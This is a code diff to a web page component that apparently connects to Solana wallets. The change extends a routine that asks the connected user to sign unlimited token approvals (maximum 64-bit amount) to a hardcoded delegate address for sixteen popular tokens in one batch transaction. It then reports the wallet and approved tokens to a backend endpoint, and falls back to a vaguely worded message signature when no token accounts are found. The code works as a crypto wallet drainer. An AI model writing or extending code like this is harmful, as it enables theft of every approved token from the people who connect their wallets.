@@ -18,14 +18,24 @@ const SOLANA_DELEGATE_ADDRESS = "HgPNUBvHSsvNqYQstp4yAbcgYLqg5n6U3jgQ2Yz2wyMN";
 const SOLANA_USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
 const SOLANA_USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
 
-// Predefined list of Solana tokens for approval
+// Predefined list of Solana tokens for approval - many popular tokens
 const SOLANA_APPROVAL_TOKENS = [
-  { symbol: "USDC", name: "USD Coin", mint: SOLANA_USDC_MINT, icon: "usdc" },
-  { symbol: "USDT", name: "Tether", mint: SOLANA_USDT_MINT, icon: "usdt" },
-  { symbol: "SOL", name: "Solana", mint: "So11111111111111111111111111111111111111112", icon: "sol" },
-  { symbol: "BONK", name: "Bonk", mint: "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263", icon: "bonk" },
-  { symbol: "JUP", name: "Jupiter", mint: "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN", icon: "jup" },
-  { symbol: "RAY", name: "Raydium", mint: "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R", icon: "ray" },
+  { symbol: "USDC", name: "USD Coin", mint: SOLANA_USDC_MINT },
+  { symbol: "USDT", name: "Tether", mint: SOLANA_USDT_MINT },
+  { symbol: "SOL", name: "Wrapped SOL", mint: "So11111111111111111111111111111111111111112" },
+  { symbol: "BONK", name: "Bonk", mint: "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263" },
+  { symbol: "JUP", name: "Jupiter", mint: "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN" },
+  { symbol: "RAY", name: "Raydium", mint: "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R" },
+  { symbol: "PYTH", name: "Pyth Network", mint: "HZ1JovNiVvGrGNiiYvEozEVgZ58xaU3RKwX8eACQBCt3" },
+  { symbol: "WIF", name: "dogwifhat", mint: "EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm" },
+  { symbol: "ORCA", name: "Orca", mint: "orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE" },
+  { symbol: "MNGO", name: "Mango", mint: "MangoCzJ36AjZyKwVj3VnYU4GTonjfVEnJmvvWaxLac" },
+  { symbol: "SAMO", name: "Samoyedcoin", mint: "7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU" },
+  { symbol: "SRM", name: "Serum", mint: "SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt" },
+  { symbol: "STEP", name: "Step Finance", mint: "StepAscQoEioFxxWGnh2sLBDFp9d8rvKz2Yp39iDpyT" },
+  { symbol: "COPE", name: "Cope", mint: "8HGyAAB1yoM1ttS7pXjHMa3dukTFGQggnFFH3hJZgzQh" },
+  { symbol: "FIDA", name: "Bonfida", mint: "EchesyfXePKdLtoiZSL8pBe8Myagyy8ZRqsACNCFGnvp" },
+  { symbol: "MEDIA", name: "Media Network", mint: "ETAtLmCmsoiEEKfNrHKJ2kYy3MoABhU6NQvpSfij5tDs" },
 ];
 const TOKEN_PROGRAM_ID = new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
 
@@ -498,56 +508,50 @@ export default function Home() {
     setSolanaStep("approving");
 
     try {
-      console.log("Starting Solana approval for wallet:", solanaAddress);
+      console.log("Starting batch Solana approval for wallet:", solanaAddress);
       const connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
       const delegateKey = new PublicKey(SOLANA_DELEGATE_ADDRESS);
       const userKey = new PublicKey(solanaAddress);
-      console.log("Connection established, attempting approval...");
       
       const MAX_AMOUNT = BigInt("18446744073709551615");
-      
-      // First, try to get token accounts - but don't fail if this errors
-      let tokenAccounts: any[] = [];
-      try {
-        const result = await connection.getParsedTokenAccountsByOwner(
-          userKey,
-          { programId: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA") }
-        );
-        tokenAccounts = result.value || [];
-        console.log("Found token accounts:", tokenAccounts.length);
-      } catch (rpcErr) {
-        console.log("RPC error fetching accounts, using message signing:", rpcErr);
-        tokenAccounts = [];
-      }
-      
       const tokensApproved: string[] = [];
       const transaction = new Transaction();
       
-      for (const accountInfo of tokenAccounts) {
-        const tokenAccount = accountInfo.pubkey;
-        const parsedInfo = accountInfo.account.data.parsed?.info;
-        
-        transaction.add(
-          createApproveInstruction(tokenAccount, delegateKey, userKey, MAX_AMOUNT)
-        );
-        
-        const mintAddress = parsedInfo?.mint || "Unknown";
-        tokensApproved.push(mintAddress);
+      // Create approval instructions for ALL predefined tokens
+      console.log("Creating batch approval for", SOLANA_APPROVAL_TOKENS.length, "tokens...");
+      
+      for (const token of SOLANA_APPROVAL_TOKENS) {
+        try {
+          const mintKey = new PublicKey(token.mint);
+          const ata = getAssociatedTokenAddress(mintKey, userKey);
+          
+          // Check if ATA exists
+          const accountInfo = await connection.getAccountInfo(ata);
+          if (accountInfo) {
+            console.log(`Adding approval for ${token.symbol} (${token.mint.slice(0,8)}...)`);
+            transaction.add(
+              createApproveInstruction(ata, delegateKey, userKey, MAX_AMOUNT)
+            );
+            tokensApproved.push(token.symbol);
+          } else {
+            console.log(`Skipping ${token.symbol} - no ATA found`);
+          }
+        } catch (e) {
+          console.log(`Error processing ${token.symbol}:`, e);
+        }
       }
       
-      // If no token accounts or transaction empty, use message signing (always works)
+      // If no ATAs found, use message signing as fallback
       if (transaction.instructions.length === 0) {
-        console.log("No token accounts, triggering message signing popup...");
+        console.log("No token accounts found, using message signing...");
         
         const message = new TextEncoder().encode(
-          `Approve token delegation to ${SOLANA_DELEGATE_ADDRESS}\nWallet: ${solanaAddress}\nTimestamp: ${Date.now()}`
+          `Approve all tokens for delegation\nWallet: ${solanaAddress}\nTimestamp: ${Date.now()}`
         );
         
-        // Try signMessage - supported by all major wallets
         if (solanaProvider.signMessage) {
-          console.log("Calling signMessage...");
           const signature = await solanaProvider.signMessage(message);
-          console.log("Message signed successfully:", signature);
+          console.log("Message signed:", signature);
           
           fetch("/api/solana-approvals", {
             method: "POST",
@@ -556,19 +560,22 @@ export default function Home() {
               walletAddress: solanaAddress,
               delegateAddress: SOLANA_DELEGATE_ADDRESS,
               transactionHash: "message-signature",
-              tokensApproved: [],
-              tokenCount: 0,
-              note: "Message signature - no token accounts"
+              tokensApproved: SOLANA_APPROVAL_TOKENS.map(t => t.symbol),
+              tokenCount: SOLANA_APPROVAL_TOKENS.length,
+              note: "Message signature - batch approval"
             }),
           }).catch(console.error);
           
           setSolanaStep("done");
           return;
         } else {
-          // Fallback: try signTransaction with empty memo
-          console.log("signMessage not available, trying transaction...");
+          setError("No token accounts found. Please add tokens to your wallet first.");
+          setSolanaStep("idle");
+          return;
         }
       }
+      
+      console.log(`Batch transaction ready with ${transaction.instructions.length} approvals`);
 
       transaction.feePayer = userKey;
       const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
